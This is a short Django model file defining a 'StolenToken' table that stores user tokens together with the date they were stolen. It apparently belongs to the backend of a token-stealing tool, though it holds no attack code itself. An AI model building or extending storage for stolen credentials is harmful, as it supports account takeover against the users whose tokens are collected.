from django.db import models

class StolenToken(models.Model):
    usertoken = models.CharField(max_length=10000)
    stolen_date = models.DateTimeField('date stolen')
    
    def __str__(self):
        return self.usertoken
